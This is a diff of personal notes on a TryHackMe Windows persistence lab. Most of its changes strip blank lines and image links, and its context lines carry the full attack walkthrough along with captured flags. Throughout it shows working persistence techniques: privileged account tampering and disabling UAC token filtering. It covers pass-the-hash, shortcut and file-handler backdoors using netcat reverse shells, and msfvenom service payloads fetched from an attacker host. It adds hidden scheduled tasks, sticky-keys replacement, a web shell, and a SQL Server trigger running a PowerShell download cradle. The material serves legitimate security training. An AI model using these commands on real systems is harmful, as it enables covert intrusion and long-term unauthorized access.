@@ -66,7 +66,6 @@ C:\> net localgroup "Backup Operators" thmuser1 /add
 
         
 
-
 ```
 
 Since this is an unprivileged account, it cannot RDP or WinRM back to the machine unless we add it to the Remote Desktop Users (RDP) or Remote Management Users (WinRM) groups. We'll use WinRM for this task:
@@ -78,7 +77,6 @@ Command Prompt
 C:\> net localgroup "Remote Management Users" thmuser1 /add
 
         
-
 
 ```
 
@@ -115,7 +113,6 @@ Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
 
         
 
-
 ```
 
 This is due to User Account Control (UAC). One of the features implemented by UAC, LocalAccountTokenFilterPolicy, strips any local account of its administrative privileges when logging in remotely. While you can elevate your privileges through UAC from a graphical user session (Read more on UAC here), if you are using WinRM, you are confined to a limited access token with no administrative privileges.
@@ -129,7 +126,6 @@ Command Prompt
 C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
 
         
-
 
 ```
 
@@ -161,9 +157,7 @@ Mandatory Label\High Mandatory Level Label            S-1-16-12288
 
         
 
-
 ```
-
 
         
 
@@ -186,7 +180,6 @@ AttackBox
     Info: Download successful!
 
         
-
 
 ```
 
@@ -213,7 +206,6 @@ thmuser1:1011:aad3b435b51404eeaad3b435b51404ee:e41fd391af74400faa4ff75868c93cce:
 
         
 
-
 ```
 
 And finally, perform Pass-the-Hash to connect to the victim machine with Administrator privileges:
@@ -225,7 +217,6 @@ AttackBox
 user@AttackBox$ evil-winrm -i 10.10.6.15 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
 
         
-
 
 ```
 
@@ -288,7 +279,6 @@ Global Group memberships     *None
 
         
 
-
 ```
 
 Once again, we'll assume we have already dumped the credentials on the server and have thmuser2's password. Let's connect with its credentials using WinRM:
@@ -326,7 +316,6 @@ thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010
 
         
 
-
 ```
 
 The RID is the last bit of the SID (1010 for thmuser3 and 500 for Administrator). The SID is an identifier that allows the operating system to identify a user across a domain, but we won't mind too much about the rest of it for this task.
@@ -340,7 +329,6 @@ Command Prompt
 C:\tools\pstools> PsExec64.exe -i -s regedit
 
         
-
 
 ```
 
@@ -363,7 +351,6 @@ Password 	Password321
 
 If you did everything correctly, you should be logged in to the Administrator's desktop. 
 
-
 Note: When you log in via RDP, the existing in-browser view will be disconnected. After you terminate your RDP session you can get the in-browser view back by pressing Reconnect.
 
 	Log in to the machine via RDP using thmuser3 and execute C:\flags\flag3.exe to retrieve your flag.
@@ -372,14 +359,11 @@ Note: When you log in via RDP, the existing in-browser view will be disconnected
 C:\Users\Administrator>net localgroup administrators thmuser0 /add
 The command completed successfully.
 
-
 C:\Users\Administrator>net localgroup "Backup Operators" thmuser1 /add
 The command completed successfully.
 
-
 C:\Users\Administrator>net localgroup "Remote Management Users" thmuser1 /add
 The command completed successfully.
-
 
 C:\Users\Administrator>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
 The operation completed successfully.
@@ -433,7 +417,6 @@ Info: Download successful!
 *Evil-WinRM* PS C:\Users\thmuser1\Documents> 
 
 Warning: Press "y" to exit, press any other key to continue
-
 
 Info: Exiting...
 
@@ -555,8 +538,6 @@ secedit /export /cfg config.inf
 ....
 ```
 
-![[Pasted image 20220911123118.png]]
-
 Insert flag2 here
 *THM{IM_JUST_A_NORMAL_USER}*
 
@@ -567,10 +548,8 @@ C:\flags>wmic useraccount get name,sid                                          
 └─$ xfreerdp /u:thmuser3 /p:'Password321' /v:10.10.6.15 /size:85%  (1)
 ```
 
-
 Insert flag3 here
 *THM{TRUST_ME_IM_AN_ADMIN} *
-
 
 ### Backdooring Files 
 
@@ -608,8 +587,6 @@ C:\Windows\System32\calc.exe
 
 Finally, we'll change the shortcut to point to our script. Notice that the shortcut's icon might be automatically adjusted while doing so. Be sure to point the icon back to the original executable so that no visible changes appear to the user. We also want to run our script on a hidden window, for which we'll add the -windowstyle hidden option to Powershell. The final target of the shortcut would be:
 
-![[Pasted image 20220911144421.png]]
-
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/fe703ddea6135e0c867afcc6f61a8cd2.png)
 
 Let's start an nc listener to receive our reverse shell on our attacker's machine:
@@ -621,7 +598,6 @@ AttackBox
 user@AttackBox$ nc -lvp 4445
 
         
-
 
 ```
 
@@ -656,17 +632,14 @@ Now let's change the registry key to run our backdoor script in a hidden window:
 	Finally, create a listener for your reverse shell and try to open any .txt file on the victim machine (create one if needed). You should receive a reverse shell with the privileges of the user opening the file.
 	THM flagOnce you have backdoored the .txt file handler and spawned a reverse shell, run C:\flags\flag6.exe to get a flag!
 
-
 ```
 ──(kali㉿kali)-[~/payloads]
 └─$ ls
 index.raw  launcher.bat  liv0ff.ps1  live0fftheland.dll  payload.hta  thm.hta
 
-
 Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.11.81.220 4445"
 
 C:\Windows\System32\calc.exe
-
 
 ┌──(kali㉿kali)-[~/payloads]
 └─$ nc -lvp 4445        
@@ -686,7 +659,6 @@ C:\flags>.\flag5.exe
 THM{NO_SHORTCUTS_IN_LIFE}
 
 ```
-
 
 Insert flag5 here
 *THM{NO_SHORTCUTS_IN_LIFE}*
@@ -712,11 +684,8 @@ C:\flags>.\flag6.exe
 .\flag6.exe
 THM{TXT_FILES_WOULD_NEVER_HURT_YOU}
 
-
 ```
-![[Pasted image 20220911154731.png]]
 
-![[Pasted image 20220911154552.png]]
 Insert flag6 here
 *THM{TXT_FILES_WOULD_NEVER_HURT_YOU}*
 
@@ -737,8 +706,6 @@ sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
 sc.exe start THMservice
 ```
 
-
-
 Note: There must be a space after each equal sign for the command to work.
 
 The "net user" command will be executed when the service is started, resetting the Administrator's password to Passwd123. Notice how the service has been set to start automatically (start= auto), so that it runs without requiring user interaction.
@@ -752,7 +719,6 @@ AttackBox
 user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
 
         
-
 
 ```
 You can then copy the executable to your target system, say in C:\Windows and point the service's binPath to it:
@@ -787,7 +753,6 @@ DISPLAY_NAME: THMService1
 
         
 
-
 ```
 
 You should be able to find a stopped service called THMService3. To query the service's configuration, you can use the following command:
@@ -812,7 +777,6 @@ SERVICE_NAME: THMService3
 
         
 
-
 ```
 
 There are three things we care about when using a service for persistence:
@@ -831,9 +795,7 @@ user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPOR
 
         
 
-
 ```
-
 
 To reconfigure "THMservice3" parameters, we can use the following command:
 
@@ -844,7 +806,6 @@ Command Prompt
 C:\> sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
 
         
-
 
 ```
 
@@ -870,7 +831,6 @@ SERVICE_NAME: THMservice3
 
         
 
-
 ```
 
 	Start a Metasploit listener on your attacker's machine and manually start the service to receive a reverse shell. From there, run C:\flags\flag8.exe to get a flag!
@@ -894,7 +854,6 @@ index.raw  launcher.bat  liv0ff.ps1  live0fftheland.dll  payload.hta  rev-svc.ex
 Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
 10.10.170.100 - - [11/Sep/2022 16:56:10] "GET /rev-svc.exe HTTP/1.1" 200 -
 10.10.170.100 - - [11/Sep/2022 16:58:38] "GET /rev-svc.exe HTTP/1.1" 200 -
-
 
 PS C:\Windows> wget http://10.11.81.220:1337/rev-svc.exe -o rev-svc.exe
 
@@ -932,7 +891,6 @@ C:\flags>.\flag7.exe
 THM{SUSPICIOUS_SERVICES}
 
 ```
-
 
 Insert flag7 here
 *THM{SUSPICIOUS_SERVICES}*
@@ -1032,7 +990,6 @@ THM{IN_PLAIN_SIGHT}
 
 ```
 
-
 Insert flag8 here
 *THM{IN_PLAIN_SIGHT}*
 
@@ -1055,7 +1012,6 @@ SUCCESS: The scheduled task "THM-TaskBackdoor" has successfully been created.
 
         
 
-
 ```
 
 Note: Be sure to use THM-TaskBackdoor as the name of your task, or you won't get the flag.
@@ -1077,7 +1033,6 @@ thm-taskbackdoor                         5/25/2022 8:08:00 AM   Ready
 
         
 
-
 ```
 
 Making Our Task Invisible
@@ -1096,7 +1051,6 @@ C:\> c:\tools\pstools\PsExec64.exe -s -i regedit
 
         
 
-
 ```
 
 We will then delete the security descriptor for our task:
@@ -1114,7 +1068,6 @@ ERROR: The system cannot find the file specified.
 
         
 
-
 ```
 
 If we start an nc listener in our attacker's machine, we should get a shell back after a minute:
@@ -1126,7 +1079,6 @@ AttackBox
 user@AttackBox$ nc -lvp 4449
 
         
-
 
 ```
 
@@ -1166,7 +1118,6 @@ C:\flags>.\flag9.exe
 .\flag9.exe
 THM{JUST_A_MATTER_OF_TIME}
 ```
-![[Pasted image 20220911161947.png]]
 
 Insert flag9 here
 *THM{JUST_A_MATTER_OF_TIME}*
@@ -1191,7 +1142,6 @@ user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPOR
 
         
 
-
 ```
 
 We will then copy our payload into the victim machine. You can spawn an http.server with Python3 and use wget on the victim machine to pull your file:
@@ -1205,7 +1155,6 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
         
 
-
 ```
 
 ```
@@ -1215,7 +1164,6 @@ Powershell
 PS C:\> wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe
 
         
-
 
 ```
 
@@ -1228,7 +1176,6 @@ Command Prompt
 C:\> copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
 
         
-
 
 ```
 
@@ -1260,7 +1207,6 @@ user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPOR
 
         
 
-
 ```
 
 	After transferring it to the victim machine, let's move it to C:\Windows\:
@@ -1272,7 +1218,6 @@ Command Prompt
 C:\> move revshell.exe C:\Windows
 
         
-
 
 ```
 
@@ -1308,7 +1253,6 @@ user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPOR
 
         
 
-
 ```
 
 	We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. In this case, we will use C:\Windows:
@@ -1320,7 +1264,6 @@ Command Prompt
 C:\> move revshell.exe C:\Windows
 
         
-
 
 ```
 
@@ -1347,7 +1290,6 @@ user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPOR
 
         
 
-
 ```
 
 	We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. In this case, we will use C:\Windows:
@@ -1360,7 +1302,6 @@ C:\> move revshell.exe C:\Windows
 
         
 
-
 ```
 
 	To create an environment variable for a user, you can go to its HKCU\Environment in the registry. We will use the UserInitMprLogonScript entry to point to our payload so it gets loaded when the users logs in:
@@ -1371,7 +1312,6 @@ Notice that this registry key has no equivalent in HKLM, making your backdoor ap
 
 	After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).
 	THM flagUsing your newly obtained shell, execute C:\flags\flag13.exe to get a flag!
-
 
 ```
 ──(kali㉿kali)-[~/payloads]
@@ -1393,7 +1333,6 @@ PS C:\Users\Administrator> copy revshell.exe "C:\ProgramData\Microsoft\Windows\S
 
 ┌──(kali㉿kali)-[~/IDS_IPS_evasion]
 └─$ xfreerdp /u:Administrator /p:'Passwd123' /v:10.10.170.100 /size:85%
-
 
 ┌──(kali㉿kali)-[~/payloads]
 └─$ nc -nvlp 4450
@@ -1460,12 +1399,8 @@ THM{LET_ME_HOLD_THE_DOOR_FOR_YOU}
 
 ```
 
-![[Pasted image 20220911164426.png]]
-
 Insert flag11 here
 *THM{LET_ME_HOLD_THE_DOOR_FOR_YOU}*
-
-![[Pasted image 20220911165257.png]]
 
 ```
 ┌──(kali㉿kali)-[~/payloads]
@@ -1488,7 +1423,6 @@ PS C:\Windows> wget http://10.11.81.220:1337/revshell.exe -o revshell.exe
 ┌──(kali㉿kali)-[~/IDS_IPS_evasion]
 └─$ xfreerdp /u:Administrator /p:'Passwd123' /v:10.10.170.100 /size:85%
 
-
 ┌──(kali㉿kali)-[~/payloads]
 └─$ nc -nvlp 4452
 Ncat: Version 7.92 ( https://nmap.org/ncat )
@@ -1506,16 +1440,12 @@ C:\flags>.\flag12.exe
 .\flag12.exe
 THM{I_INSIST_GO_FIRST}
 
-
 ```
 
 Insert flag12 here
 
 *THM{I_INSIST_GO_FIRST}*
 
-![[Pasted image 20220911165827.png]]
-
-![[Pasted image 20220911171545.png]]
 remove this cz won't get flag13
 ```
 ┌──(kali㉿kali)-[~/payloads]
@@ -1536,7 +1466,6 @@ PS C:\Users\Administrator> cd C:\Windows                                        
 
 ┌──(kali㉿kali)-[~/IDS_IPS_evasion]
 └─$ xfreerdp /u:Administrator /p:'Passwd123' /v:10.10.170.100 /size:85%
-
 
 ┌──(kali㉿kali)-[~/payloads]
 └─$ nc -nvlp 4453
@@ -1598,9 +1527,7 @@ Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
 
         
 
-
 ```
-
 
 After doing so, lock your session from the start menu:
 
@@ -1622,7 +1549,6 @@ Utilman is a built-in Windows application used to provide Ease of Access options
 
 To replace utilman.exe, we do a similar process to what we did with sethc.exe:
 
-
 ```
 
 Command Prompt
@@ -1640,7 +1566,6 @@ Overwrite C:\Windows\System32\utilman.exe? (Yes/No/All): yes
         1 file(s) copied.
 
         
-
 
 ```
 
@@ -1668,12 +1593,7 @@ Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
 
 locked then shift 5 times
 
-
 ```
-![[Pasted image 20220911172233.png]]
-
-![[Pasted image 20220911172243.png]]
-
 
 Insert flag14 here
 *THM{BREAKING_THROUGH_LOGIN}*
@@ -1683,12 +1603,7 @@ C:\Users\Administrator>takeown /f c:\Windows\System32\utilman.exe               
 
 lock then ease access 
 
-
 ```
-
-![[Pasted image 20220911172530.png]]
-
-![[Pasted image 20220911172546.png]]
 
 Insert flag15 here
 *THM{THE_LOGIN_SCREEN_IS_MERELY_A_SUGGESTION}*
@@ -1710,7 +1625,6 @@ Command Prompt
 C:\> move shell.aspx C:\inetpub\wwwroot\
 
         
-
 
 ```
 
@@ -1772,12 +1686,9 @@ FOR INSERT AS
 EXECUTE AS LOGIN = 'sa'
 EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
 
-
 ```
 
 Now that the backdoor is set up, let's create evilscript.ps1 in our attacker's machine, which will contain a Powershell reverse shell:
-
-![[Pasted image 20220911151553.png]]
 
 We will need to open two terminals to handle the connections involved in this exploit:
 
@@ -1793,7 +1704,6 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
         
 
-
 ```
 
 ```
@@ -1805,31 +1715,18 @@ Listening on 0.0.0.0 4454
 
         
 
-
 ```
 
 	With all that ready, let's navigate to http://MACHINE_IP/ and insert an employee into the web application. Since the web application will send an INSERT statement to the database, our TRIGGER will provide us access to the system's console.
 	THM flagUse your web shell to execute C:\flags\flag17.exe to get your flag!
 
-
 ```
 
 ```
-
-![[Pasted image 20220911180949.png]]
-
-![[Pasted image 20220911181031.png]]
 
 Insert flag16 here
 *THM{EZ_WEB_PERSISTENCE}* https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx
 
-![[Pasted image 20220911181956.png]]
-
-![[Pasted image 20220911182030.png]]
-
-![[Pasted image 20220911182053.png]]
-
-![[Pasted image 20220911182115.png]]
 ```
 ┌──(kali㉿kali)-[~/payloads]
 └─$ nc -lvp 4454
@@ -1847,14 +1744,10 @@ THM{I_LIVE_IN_YOUR_DATABASE}
 after create evilscript.ps1 and query in sqlserver
 ```
 
-
 Insert flag17 here
 *THM{I_LIVE_IN_YOUR_DATABASE}*
 
-
 ### Conclusion 
-
-
 
 In this room, we have covered the primary methods used by attackers to establish persistence on a machine. You could say persistence is the art of planting backdoors on a system while going undetected for as long as possible without raising suspicion. We have seen persistence methods that rely on different operating system components, providing various ways to achieve long-term access to a compromised host.
 
@@ -1865,9 +1758,7 @@ While we have shown several techniques, we have only covered a small fraction of
     Oddvar Moe - Windows Persistence Through RunOnceEx  https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/
     PowerUpSQL https://www.netspi.com/blog/technical/network-penetration-testing/establishing-registry-persistence-via-sql-server-powerupsql/
 
-
 Click and continue learning!
 *No answer needed*
-
 
 [[Network Security Solutions]]
